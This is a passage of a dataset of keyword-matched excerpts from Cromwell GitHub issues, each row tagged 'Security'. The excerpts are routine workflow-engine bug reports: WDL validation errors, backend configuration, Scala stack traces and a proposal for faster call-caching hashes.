Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:4194,hash,hashes,4194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['hash'],['hashes']
Security,"ow will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 1000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Number of workers to assign to PAPI requests; request-workers = 3. genomics {; # A reference to an auth defined in the `google` stanza at the top.; # This auth is used to create pipelines and manipulate auth JSONs.; auth = ""application-default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-west1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration tu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:2801,access,access,2801,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['access'],['access']
Security,"ow, I'm trying to get that WDL uploaded to Terra and the WOMtool validation step continues to pass me a fatal error that I can't seem to figure out. I've reduced the WDL to a single step that can reproduce this error and pasted below. I can't imagine I'm the first person to have this issue, but couldn't find evidence of it on the interwebs! In sum, I have a WDL that appears to be working fine (via miniwdl), but WOMtool (and Dockstore for that matter) finds a fatal error that prevents me from using it on Terra. Please help, thanks!!!. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; `ERROR: Unexpected symbol (line 6, col 5) when parsing 'setter'. Expected equal, got ""String"". String bam_to_reads_mem_size ^ $setter = :equal $e -> $1 `. <!-- Which backend are you running? -->; `womtool v61`; `miniwdl v1.5.2`. <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0 . #WORKFLOW DEFINITION; workflow StripReadsFromBam {; String bam_to_reads_disk_size; String bam_to_reads_mem_size. #converts BAM to FASTQ (R1 + R2); call BamToReads {; 	input:; 	disk_size = bam_to_reads_disk_size,; 	mem_size = bam_to_reads_mem_size; }. #Outputs single reads file; output {; File outputReads = BamToReads.outputReads; }; }. #Task Definitions; task BamToReads {; File InputBam; String SampleName; String disk_size; String mem_size. #Calls samtools view to do the conversion; command {; #Set -e and -o says if any command I run fails in this script, make sure to return a failure; set -e; set -o pipefail. samtools fastq -c9 -@4 -n -o ${SampleName}.fq.gz ${InputBam} . }. #Run time attributes:; runtime {; docker: ""drpintothe2nd/ac3_xysupp""; memory: mem_size; cpu: ""4""; disks: ""local-disk "" + disk_size + "" HDD""; 	}; ; output {; 	File outputReads = ""${SampleName}.fq.gz""; 	}; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Running locally on windows 10 WSL, ubuntu 20.04",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6767:2343,PASSWORD,PASSWORDS,2343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767,1,['PASSWORD'],['PASSWORDS']
Security,ow.WorkflowActor$$anonfun$fetchLocallyQualifiedInputs$1.apply(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwel,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5769,Hash,HashMap,5769,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"ow:; ```; version 1.0. import ""SubWorkflow.wdl"" as SubWorkflow. workflow MainWorkflow {; input {; String value_2_give = ""default value""; }; call MainTask {; input:; given_value = value_2_give; }. call SubWorkflow.SubWorkflow {; input:; value_2_give = value_2_give; }; }. task MainTask {; input {; String given_value; String? overwrite_given_value; }; command <<<; echo ~{select_first([overwrite_given_value, given_value])};; >>>; }; ```. The subworkflow:; ```; version 1.0. workflow SubWorkflow {; input {; String value_2_give = ""default value""; String? overwrite_value_2_give; }; call SubTask {; input:; given_value = select_first([overwrite_value_2_give, value_2_give]); }; }. task SubTask {; input {; String given_value; String? overwrite_given_value; }; command <<<; echo ~{select_first([overwrite_given_value, given_value])};; >>>; }; ```. To be sure I ran the validation mode of womtools:; ```; $ java -jar womtool-84.jar validate MainWorkflow.wdl; Success!; $ java -jar womtool-84.jar validate SubWorkflow.wdl; Success!; ```. After creating these files, I ran womtool with the ""inputs"" option getting the following output:; ```; $ java -jar womtool-84.jar inputs MainWorkflow.wdl; {; ""MainWorkflow.SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""MainWorkflow.MainTask.overwrite_given_value"": ""String? (optional)"",; ""MainWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; This output json shows which variables you can (or must) provide in order to be able to run in this case the main workflow. here we see that we are able to provide values for the Mainworkflow, MainTask and SubWorkflow but not the SubTask.; If we do the same for just the subworkflow:; ```; $ java -jar womtool-84.jar inputs SubWorkflow.wdl; {; ""SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""SubWorkflow.SubTask.overwrite_given_value"": ""String? (optional)"",; ""SubWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; We see that we are a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6841:1431,validat,validate,1431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6841,1,['validat'],['validate']
Security,"p.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystem",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:1980,Validat,Validation,1980,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Validat'],['Validation']
Security,"p_validation_gatkp_run_local_paths.json.metadata.json; ```. Error message:. ```; [2016-09-21 17:51:25,15] [error] Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); java.lang.RuntimeException: Expression evaluation failed due to wdl4s.WdlExpressionException: Cannot perform operation: WdlString(broadinstitute) / WdlString(gatk): WdlExpression((Subtract: lhs=(Divide: lhs=<string:1:1 identifier ""YnJvYWRpbnN0aXR1dGU="">, rhs=<string:1:16 identifier ""Z2F0aw=="">), rhs=<string:1:21 identifier ""cHJvdGVjdGVk"">)); at cromwell.backend.validation.RuntimeAttributesValidation$class.validateOptionalExpression(RuntimeAttributesValidation.scala:319); at cromwell.backend.validation.RuntimeAttributesValidation$$anon$1.validateOptionalExpression(RuntimeAttributesValidation.scala:90); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.sfs.SharedFileSystemInitializationActor$$anonfun$runtimeAttributeValidators$1$$anonfun$apply$1.apply(SharedFileSystemInitializationActor.scala:48); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:141); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$badRuntimeAttrsForTask$1$2.apply(BackendWorkflowInitializationActor.scala:139); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245); at scala.collection.immutable.Map$Map3.foreach(Map.scala:161); ....snip....; ```. default_runtime:. ```; {; ""default_runtime_attributes"": {; ""docker"": ""broadinstitute/g",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1465:1739,validat,validateOptionalExpression,1739,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1465,1,['validat'],['validateOptionalExpression']
Security,pass with a warning message if no secure environment variables,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3103:34,secur,secure,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3103,1,['secur'],['secure']
Security,pesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$LoaderCache.getOrElseUpdate(ConfigImpl.java:66); at com.typesafe.config.impl.ConfigImpl.computeCachedConfig(ConfigImpl.java:93); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:261); at com.typesafe.config.ConfigFactory.load(ConfigFactory.java:237); at cromwell.languages.util.ImportResolver$HttpResolver$.apply(ImportResolver.scala:237); at womtool.input.WomGraphMaker$.importResolvers$lzycompute$1(WomGraphMaker.scala:28); at womtool.input.WomGraphMaker$.importResolvers$1(WomGraphMaker.scala:27); at womtool.input.WomGraphMaker$.$anonfun$getBundleAndFactory$1(WomGraphMaker.scala:39); at scala.util.Either.flatMap(Either.scala:352); at womtool.input.WomGraphMaker$.getBundleAndFactory(WomGraphMaker.scala:30); at womtool.input.WomGraphMaker$.fromFiles(WomGraphMaker.scala:46); at womtool.validate.Validate$.validate(Validate.scala:26); at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:54); at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:161); at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:166); at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:27); at scala.Function0.apply$mcV$sp(Function0.scala:42); at scala.Function0.apply$mcV$sp$(Function0.scala:42); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:17); at scala.App.$anonfun$main$1(App.scala:98); at scala.App.$anonfun$main$1$adapted(App.scala:98); at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:575); at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:573); at scala.collection.AbstractIterable.foreach(Iterable.scala:933); at scala.App.main(App.scala:98); at scala.App.main$(App.scala:96); at womtool.WomtoolMain$.main(WomtoolMain.scala:27); at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: com.typesafe.config.ConfigException$IO: ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:3630,validat,validate,3630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,2,"['Validat', 'validat']","['Validate', 'validate']"
Security,"pl.Parseable.parseValue(Parseable.java:190); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:152); at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:185); ... 48 more; Caused by: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:726); at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:701); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); ... 51 more; ```. <!-- Which backend are you running? -->. The backend I'm running on is slurm and local . <!-- Paste/Attach your workflow if possible: -->. Workflow link. <!-- Def not an joke about best practices. Also thanks for publishing the gatk best practices and the warp pipelines -->. https://github.com/mmterpstra/Bestie. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Below are the first few lines of the config shown. ```; #see also https://cromwell.readthedocs.io/en/stable/backends/SLURM/; # include the application.conf at the top; include required(classpath(""application"")); workflow-options {; workflow-failure-mode = ContinueWhilePossible; delete_intermediate_output_files = true; final_workflow_outputs_dir = ""cromwell-results"",; use_relative_output_paths = true,; final_workflow_log_dir = ""cromwell-logs"",; final_call_logs_dir = ""cromwell-call_logs""; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=50000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }; backend {; default = ""Loca",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:5759,PASSWORD,PASSWORDS,5759,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['PASSWORD'],['PASSWORDS']
Security,pply(SprayJsonSupport.scala:42); #011at spray.httpx.SprayJsonSupport$$anonfun$sprayJsonMarshaller$1.apply(SprayJsonSupport.scala:44); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:27); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:37); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:29); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); #011at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:90); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:92); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:46); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245); #011at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:732),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2438:3229,Hash,HashMap,3229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2438,1,['Hash'],['HashMap']
Security,"pport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have different folder structure, which could be the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4748,Validat,Validation,4748,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Validat'],['Validation']
Security,"pport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4661,Validat,Validation,4661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['Validat'],['Validation']
Security,prayJsonMarshaller$1.apply(SprayJsonSupport.scala:44); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:27); #011at spray.json.PrettyPrinter$.apply(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.apply(JsonPrinter.scala:37); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:29); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); #011at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:90); #011at spray.json.JsonPrinter$$anonfun$printSeq$1.apply(JsonPrinter.scala:92); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$$anonfun$printObject$2.apply(PrettyPrinter.scala:46); #011at spray.json.PrettyPrinter$.print(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.print(PrettyPrinter.scala:34); #011at spray.json.PrettyPrinter$.printObject(PrettyPrinter.scala:69); #011at spray.json.PrettyPrinter$class.printObject(PrettyPrinter.scala:42); #011at spray.json.PrettyPrinter$.printSeq(PrettyPrinter.scala:69); #011at spray.json.JsonPrinter$class.printSeq(JsonPrinter.scala:90); #011at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245); #011at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:732); #011at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245); #011,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2438:3308,Hash,HashMap,3308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2438,1,['Hash'],['HashMap']
Security,"problems with path+modtime; I have been doing some call-caching benchmarking on the [BioWDL RNA-seq](https://github.com/biowdl/RNA-seq) pipeline and it turns out any `path` or `path+modtime` strategies do not work with containers. As is reported in these issues: #5405, #5370, #5346 . @cmarkello, @illusional, I am sorry that I insisted that `path+modtime` did work. I was using less complex workflows that did not have this problem at the time. ## Call-caching problems with file strategy; The `file` strategy does work as it uses md5sums in order to calculate the file hash. An unfortunate side effect of this is that md5 uses massive system resources. On HPC systems that are the target for the sfs-backend, this is a big problem. Cromwell will be run from a submit node on the system and greedily grab all processing power on the submit node to calculate all the md5sums. . ## Md5sums; Md5sums are reliable hashes for file integrity, but this was not their intended purpose. Md5sum was intended as a cryptographic hash. A cryptographic hash has the following properties (wikipedia):; 1. it is deterministic, meaning that the same message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:1034,hash,hash,1034,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,1,['hash'],['hash']
Security,"ps://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl; (https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl Ln 3 Col 1) Failed to import https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl, exceeded import_max_depth; circular imports?; None; ```. ## Backends; * Terra (kind of); * Mac OS on womtool 76; * Ubuntu on womtool 56. I say ""kind of"" for Terra since I can't see the error message -- if you try to upload this workflow to the Broad Methods Repo, a 500 error will result, and I've a hunch that's the result of the stack overflow. ## Example workflow; ```; version 1.0. import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl""; # note: that workflow also has the line import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segment_scatter.wdl""; # I meant to actually import ""https://raw.githubusercontent.com/aofarrel/Stuart-WDL/segment_scatter/segfault.wdl"". workflow Segment_Scatter {; 	input {; 		# if you input 10 files and n_segments = 5, each segment gets 2 files; 		Array[File] input_files; 		Int n_segments; 	}. 	call segfault.segfault {; 		input:; 			inputs = input_files,; 			n_segments = n_segments; 	}. 	scatter(segment in segfault.segments) {; 		call echo_files {; 			input:; 				files_to_echo = segment; 		}; 	}; }. task echo_files {; 	input {; 		Array[File] files_to_echo; 	}. 	command 